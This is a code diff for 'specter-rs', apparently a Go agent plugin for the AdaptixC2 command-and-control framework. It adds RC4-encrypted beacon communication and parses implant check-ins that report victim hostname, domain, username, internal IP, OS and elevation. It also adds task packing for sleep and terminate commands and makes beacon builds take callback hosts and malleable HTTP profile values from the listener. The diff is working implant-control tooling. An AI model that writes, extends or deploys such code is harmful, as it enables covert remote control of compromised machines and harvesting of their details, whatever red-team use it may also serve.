@@ -13,6 +13,8 @@ package main
 
 import (
 	"crypto/rand"
+	"crypto/rc4"
+	"encoding/binary"
 	"encoding/hex"
 	"encoding/json"
 	"errors"
@@ -39,7 +41,87 @@ type ExtenderAgent struct{}
 func InitPlugin(ts any, moduleDir string, watermark string) adaptix.PluginAgent {
 	ModuleDir = moduleDir
 	AgentWatermark = watermark
+	if impl, ok := ts.(Teamserver); ok {
+		Ts = impl
+	}
 	return &PluginAgent{}
+}
+
+// Teamserver: the server surface specter-rs currently exercises (the
+// native beacon_agent declares the full interface; only these members are
+// used by the MVP wire handlers).
+type Teamserver interface {
+	TsConvertCpToUTF8(data string, cp int) string
+	TsAgentUpdateData(newAgentData adaptix.AgentData) error
+	TsAgentTerminate(agentId string, terminateTaskId string) error
+	TsTaskUpdate(agentId string, data adaptix.TaskData)
+	TsAgentConsoleOutput(agentId string, messageType int, message string, clearText string, store bool)
+}
+
+var Ts Teamserver
+
+// RC4Crypt: the session cipher (Encrypt == Decrypt == RC4, docs/WIRE.md) —
+// same cipher, same keystream, as the beacon's specter_core::rc4.
+func RC4Crypt(data []byte, key []byte) ([]byte, error) {
+	cipher, err := rc4.NewCipher(key)
+	if err != nil {
+		return nil, err
+	}
+	out := make([]byte, len(data))
+	cipher.XORKeyStream(out, data)
+	return out, nil
+}
+
+// Command ids on the wire (native beacon_agent, pl_utils.go).
+const (
+	COMMAND_TERMINATE = 10
+	COMMAND_PROFILE   = 21
+)
+
+// int32ToIPv4: host-order u32 to dotted quad (native pl_utils.go).
+func int32ToIPv4(value uint) string {
+	return fmt.Sprintf("%d.%d.%d.%d", byte(value), byte(value>>8), byte(value>>16), byte(value>>24))
+}
+
+// GetOsVersion: port of the native beacon_agent mapping (pl_utils.go).
+func GetOsVersion(majorVersion uint8, minorVersion uint8, buildNumber uint, isServer bool, systemArch string) (int, string) {
+	var (
+		desc      string
+		os        = adaptix.OS_UNKNOWN
+		osVersion = "unknown"
+	)
+
+	if majorVersion == 10 && minorVersion == 0 && isServer && buildNumber >= 26100 {
+		osVersion = "Win 2025 Serv"
+	} else if majorVersion == 10 && minorVersion == 0 && isServer && buildNumber >= 19045 {
+		osVersion = "Win 2022 Serv"
+	} else if majorVersion == 10 && minorVersion == 0 && isServer && buildNumber >= 17763 {
+		osVersion = "Win 2019 Serv"
+	} else if majorVersion == 10 && minorVersion == 0 && !isServer && buildNumber >= 22000 {
+		osVersion = "Win 11"
+	} else if majorVersion == 10 && minorVersion == 0 && isServer {
+		osVersion = "Win 2016 Serv"
+	} else if majorVersion == 10 && minorVersion == 0 {
+		osVersion = "Win 10"
+	} else if majorVersion == 6 && minorVersion == 3 && isServer {
+		osVersion = "Win Serv 2012 R2"
+	} else if majorVersion == 6 && minorVersion == 3 {
+		osVersion = "Win 8.1"
+	} else if majorVersion == 6 && minorVersion == 2 && isServer {
+		osVersion = "Win Serv 2012"
+	} else if majorVersion == 6 && minorVersion == 2 {
+		osVersion = "Win 8"
+	} else if majorVersion == 6 && minorVersion == 1 && isServer {
+		osVersion = "Win Serv 2008 R2"
+	} else if majorVersion == 6 && minorVersion == 1 {
+		osVersion = "Win 7"
+	}
+
+	desc = osVersion + " " + systemArch
+	if strings.Contains(osVersion, "Win") {
+		os = adaptix.OS_WINDOWS
+	}
+	return os, desc
 }
 
 func (p *PluginAgent) GetExtender() adaptix.ExtenderAgent {
@@ -60,12 +142,109 @@ type GenerateConfig struct {
 
 // sptConfig: the beacon build contract (crates/core/build.rs).
 type sptConfig struct {
-	AESKey    string          `json:"aes_key"`
-	SleepMS   int             `json:"sleep_ms"`
-	JitterMS  int             `json:"jitter_ms"`
-	Watermark uint32          `json:"watermark"`
-	KillEpoch int64           `json:"kill_epoch"`
-	Profile   json.RawMessage `json:"profile"`
+	AESKey      string          `json:"aes_key"`
+	ListenerKey string          `json:"listener_key"`
+	SleepMS     int             `json:"sleep_ms"`
+	JitterMS    int             `json:"jitter_ms"`
+	Watermark   uint32          `json:"watermark"`
+	KillEpoch   int64           `json:"kill_epoch"`
+	Profile     json.RawMessage `json:"profile"`
+}
+
+// listenerConfig: the fields of the listener's saved profile (TransportConfig
+// of the BeaconHTTP listener) that shape the beacon — the listener is
+// authoritative, the malleable profile provides the defaults it overrides.
+type listenerConfig struct {
+	CallbackAddresses []string `json:"callback_addresses"`
+	EncryptKey        string   `json:"encrypt_key"`
+	Uri               []string `json:"uri"`
+	UserAgent         []string `json:"user_agent"`
+	HbHeader          string   `json:"hb_header"`
+	RequestHeaders    string   `json:"request_headers"`
+	PagePayload       string   `json:"page-payload"`
+}
+
+// listenerOverrides validates the listener profile: a beacon built against
+// a mismatched listener can never check in, so every mismatch fails the
+// build instead of the first check-in.
+func listenerOverrides(raw []byte) (listenerConfig, error) {
+	var conf listenerConfig
+	if err := json.Unmarshal(raw, &conf); err != nil {
+		return conf, fmt.Errorf("listener profile: %w", err)
+	}
+	if len(conf.CallbackAddresses) == 0 {
+		return conf, errors.New("listener profile: callback_addresses is required")
+	}
+	if len(conf.Uri) == 0 {
+		return conf, errors.New("listener profile: uri is required")
+	}
+	if len(conf.UserAgent) == 0 {
+		return conf, errors.New("listener profile: user_agent is required")
+	}
+	if conf.HbHeader == "" {
+		return conf, errors.New("listener profile: hb_header is required")
+	}
+	if !strings.Contains(conf.PagePayload, "<<<PAYLOAD_DATA>>>") {
+		return conf, errors.New("listener profile: page-payload must contain '<<<PAYLOAD_DATA>>>'")
+	}
+	// encrypt_key: 32 hex chars (16 bytes) — the listener validates the same.
+	if len(conf.EncryptKey) != 32 {
+		return conf, errors.New("listener profile: encrypt_key must be 32 hex chars")
+	}
+	if _, err := hex.DecodeString(conf.EncryptKey); err != nil {
+		return conf, errors.New("listener profile: encrypt_key must be hex")
+	}
+	return conf, nil
+}
+
+// applyListener overrides the malleable profile with the listener's actual
+// enforcement points (URI list, UA, hb_header, request headers, response
+// page template, callback hosts).
+func applyListener(profileRaw json.RawMessage, l listenerConfig) (json.RawMessage, error) {
+	var prof map[string]any
+	if err := json.Unmarshal(profileRaw, &prof); err != nil {
+		return nil, fmt.Errorf("malleable profile: %w", err)
+	}
+
+	prof["hosts"] = l.CallbackAddresses
+	prof["user_agent"] = l.UserAgent[0]
+	prof["beacon_id_header"] = l.HbHeader
+
+	post, ok := prof["post"].(map[string]any)
+	if !ok {
+		return nil, errors.New("profile: missing post section")
+	}
+	post["uris"] = l.Uri
+
+	client, ok := post["client"].(map[string]any)
+	if !ok {
+		return nil, errors.New("profile: missing post.client section")
+	}
+	if metadata, ok := client["metadata"].(map[string]any); ok {
+		metadata["name"] = l.HbHeader
+	}
+	headers := []string{}
+	for _, line := range strings.Split(l.RequestHeaders, "\n") {
+		if line = strings.TrimSpace(line); line != "" {
+			headers = append(headers, line)
+		}
+	}
+	client["headers"] = headers
+
+	server, ok := post["server"].(map[string]any)
+	if !ok {
+		return nil, errors.New("profile: missing post.server section")
+	}
+	output, ok := server["output"].(map[string]any)
+	if !ok {
+		return nil, errors.New("profile: missing post.server.output section")
+	}
+	const marker = "<<<PAYLOAD_DATA>>>"
+	idx := strings.Index(l.PagePayload, marker)
+	output["prepend"] = l.PagePayload[:idx]
+	output["append"] = l.PagePayload[idx+len(marker):]
+
+	return json.Marshal(prof)
 }
 
 // parseDurationMS parses "30s" / "1h 2m 5s" style sleep values.
@@ -179,13 +358,23 @@ func (p *PluginAgent) BuildPayload(profile adaptix.BuildProfile, agentProfiles [
 		return nil, "", err
 	}
 
+	listener, err := listenerOverrides(profile.ListenerProfiles[0].Profile)
+	if err != nil {
+		return nil, "", err
+	}
+	profileJSON, err := applyListener(agentProfiles[0], listener)
+	if err != nil {
+		return nil, "", err
+	}
+
 	cfg := sptConfig{
-		AESKey:    hex.EncodeToString(key),
-		SleepMS:   sleepMS,
-		JitterMS:  jitterMS,
-		Watermark: uint32(watermark),
-		KillEpoch: killEpoch,
-		Profile:   agentProfiles[0],
+		AESKey:      hex.EncodeToString(key),
+		ListenerKey: listener.EncryptKey,
+		SleepMS:     sleepMS,
+		JitterMS:    jitterMS,
+		Watermark:   uint32(watermark),
+		KillEpoch:   killEpoch,
+		Profile:     profileJSON,
 	}
 	cfgJSON, err := json.Marshal(cfg)
 	if err != nil {
@@ -223,36 +412,207 @@ func (p *PluginAgent) BuildPayload(profile adaptix.BuildProfile, agentProfiles [
 	return blob, "bin", nil
 }
 
-// CreateAgent: reached when a beacon checks in — the wire/transport lands in
-// phase 3, so no check-in can be processed yet.
+// CreateAgent: parse the first check-in beat (docs/WIRE.md — the 19-field
+// CheckPacker sequence of the native beacon_agent, tag v1.2).
 func (p *PluginAgent) CreateAgent(beat []byte) (adaptix.AgentData, adaptix.ExtenderAgent, error) {
-	return adaptix.AgentData{}, nil, errors.New("specter-rs check-in processing lands with the phase 3 transport")
+	var agentData adaptix.AgentData
+
+	packer := CreatePacker(beat)
+
+	if false == packer.CheckPacker([]string{"int", "int", "int", "int", "word", "word", "byte", "word", "word", "int", "byte", "byte", "int", "byte", "array", "array", "array", "array", "array"}) {
+		return agentData, nil, errors.New("error agentData data")
+	}
+
+	agentData.Sleep = packer.ParseInt32()
+	agentData.Jitter = packer.ParseInt32()
+	agentData.KillDate = int(packer.ParseInt32())
+	agentData.WorkingTime = int(packer.ParseInt32())
+	agentData.ACP = int(packer.ParseInt16())
+	agentData.OemCP = int(packer.ParseInt16())
+	agentData.GmtOffset = int(packer.ParseInt8())
+	agentData.Pid = fmt.Sprintf("%v", packer.ParseInt16())
+	agentData.Tid = fmt.Sprintf("%v", packer.ParseInt16())
+
+	buildNumber := packer.ParseInt32()
+	majorVersion := packer.ParseInt8()
+	minorVersion := packer.ParseInt8()
+	internalIp := packer.ParseInt32()
+	flag := packer.ParseInt8()
+
+	agentData.Arch = "x32"
+	if (flag & 0b00000001) > 0 {
+		agentData.Arch = "x64"
+	}
+
+	systemArch := "x32"
+	if (flag & 0b00000010) > 0 {
+		systemArch = "x64"
+	}
+
+	agentData.Elevated = false
+	if (flag & 0b00000100) > 0 {
+		agentData.Elevated = true
+	}
+
+	IsServer := false
+	if (flag & 0b00001000) > 0 {
+		IsServer = true
+	}
+
+	agentData.InternalIP = int32ToIPv4(internalIp)
+	agentData.Os, agentData.OsDesc = GetOsVersion(majorVersion, minorVersion, buildNumber, IsServer, systemArch)
+
+	agentData.SessionKey = packer.ParseBytes()
+	agentData.Domain = string(packer.ParseBytes())
+	agentData.Computer = string(packer.ParseBytes())
+	agentData.Username = Ts.TsConvertCpToUTF8(packer.ParseString(), agentData.ACP)
+	agentData.Process = Ts.TsConvertCpToUTF8(packer.ParseString(), agentData.ACP)
+
+	return agentData, &ExtenderAgent{}, nil
 }
 
-// --- ExtenderAgent: stubs until the wire protocol exists (phase 3). ---
+// --- ExtenderAgent: the session wire (RC4 + the native pack formats). ---
 
 func (e *ExtenderAgent) Encrypt(data []byte, key []byte) ([]byte, error) {
-	return nil, errors.New("specter-rs wire protocol is not implemented yet")
+	return RC4Crypt(data, key)
 }
 
 func (e *ExtenderAgent) Decrypt(data []byte, key []byte) ([]byte, error) {
-	return nil, errors.New("specter-rs wire protocol is not implemented yet")
+	return RC4Crypt(data, key)
 }
 
+// PackTasks: [u32 LE total size || [taskData.Data || u32 LE taskId]*].
 func (e *ExtenderAgent) PackTasks(agentData adaptix.AgentData, tasks []adaptix.TaskData) ([]byte, error) {
-	return nil, errors.New("specter-rs wire protocol is not implemented yet")
+	var (
+		array []interface{}
+		err   error
+	)
+
+	for _, taskData := range tasks {
+		taskId, err := strconv.ParseInt(taskData.TaskId, 16, 64)
+		if err != nil {
+			return nil, err
+		}
+		array = append(array, taskData.Data)
+		array = append(array, int(taskId))
+	}
+
+	packData, err := PackArray(array)
+	if err != nil {
+		return nil, err
+	}
+
+	size := make([]byte, 4)
+	binary.LittleEndian.PutUint32(size, uint32(len(packData)))
+	packData = append(size, packData...)
+
+	return packData, nil
 }
 
 func (e *ExtenderAgent) PivotPackData(pivotId string, data []byte) (adaptix.TaskData, error) {
-	return adaptix.TaskData{}, errors.New("specter-rs wire protocol is not implemented yet")
+	return adaptix.TaskData{}, errors.New("specter-rs pivots land with the SMB transport (phase 3+)")
 }
 
+// CreateCommand: the operator command surface — sleep/terminate land with
+// the command dialogs (next iteration); the beacon already parses their
+// wire records.
 func (e *ExtenderAgent) CreateCommand(agentData adaptix.AgentData, args map[string]any) (adaptix.TaskData, adaptix.ConsoleMessageData, error) {
-	return adaptix.TaskData{}, adaptix.ConsoleMessageData{}, errors.New("specter-rs commands land with the phase 3 wire")
+	return adaptix.TaskData{}, adaptix.ConsoleMessageData{}, errors.New("specter-rs command dialogs land with the next iteration")
 }
 
+// ProcessData: beacon results — the listener frame (flags 0, u32 LE
+// origLen — uncompressed pass-through of decompressZlibData), then the
+// u32 BE size and the per-task records the beacon emits.
 func (e *ExtenderAgent) ProcessData(agentData adaptix.AgentData, decryptedData []byte) error {
-	return errors.New("specter-rs wire protocol is not implemented yet")
+	var outTasks []adaptix.TaskData
+
+	taskData := adaptix.TaskData{
+		Type:        adaptix.TASK_TYPE_TASK,
+		AgentId:     agentData.Id,
+		FinishDate:  time.Now().Unix(),
+		MessageType: adaptix.MESSAGE_SUCCESS,
+		Completed:   true,
+		Sync:        true,
+	}
+
+	// Listener frame: flags:1 + origLen:4 (LE). Uncompressed passthrough
+	// when the flag is clear — the beacon never compresses (MVP).
+	if len(decryptedData) < 5 {
+		return errors.New("failed to unmarshal message")
+	}
+	flags := decryptedData[0]
+	origLen := int(decryptedData[1]) | int(decryptedData[2])<<8 | int(decryptedData[3])<<16 | int(decryptedData[4])<<24
+	data := decryptedData[5:]
+	if flags != 0 {
+		return errors.New("specter-rs MVP sends uncompressed frames only")
+	}
+	if len(data) != origLen {
+		return errors.New("failed to unmarshal message")
+	}
+
+	packer := CreatePacker(data)
+
+	if false == packer.CheckPacker([]string{"int"}) {
+		return errors.New("failed to unmarshal message")
+	}
+
+	size := packer.ParseInt32()
+	if size-4 != packer.Size() {
+		return errors.New("failed to unmarshal message")
+	}
+
+	for packer.Size() >= 8 {
+
+		if false == packer.CheckPacker([]string{"int", "int"}) {
+			break
+		}
+
+		TaskId := packer.ParseInt32()
+		commandId := packer.ParseInt32()
+		task := taskData
+		task.TaskId = fmt.Sprintf("%08x", TaskId)
+
+		switch commandId {
+
+		case COMMAND_PROFILE:
+			if false == packer.CheckPacker([]string{"int", "int", "int"}) {
+				goto HANDLER
+			}
+			subcommand := packer.ParseInt32()
+			if subcommand != 1 {
+				goto HANDLER
+			}
+			agentData.Sleep = packer.ParseInt32()
+			agentData.Jitter = packer.ParseInt32()
+			task.Message = "Sleep time has been changed"
+			_ = Ts.TsAgentUpdateData(agentData)
+
+		case COMMAND_TERMINATE:
+			if false == packer.CheckPacker([]string{"int"}) {
+				goto HANDLER
+			}
+			exitMethod := packer.ParseInt32()
+			if exitMethod == 1 {
+				task.Message = "The agent has completed its work (kill thread)"
+			} else if exitMethod == 2 {
+				task.Message = "The agent has completed its work (kill process)"
+			}
+			_ = Ts.TsAgentTerminate(agentData.Id, task.TaskId)
+
+		default:
+			continue
+		}
+
+		outTasks = append(outTasks, task)
+	}
+
+HANDLER:
+
+	for _, task := range outTasks {
+		Ts.TsTaskUpdate(agentData.Id, task)
+	}
+
+	return nil
 }
 
 func (e *ExtenderAgent) TunnelCallbacks() adaptix.TunnelCallbacks {
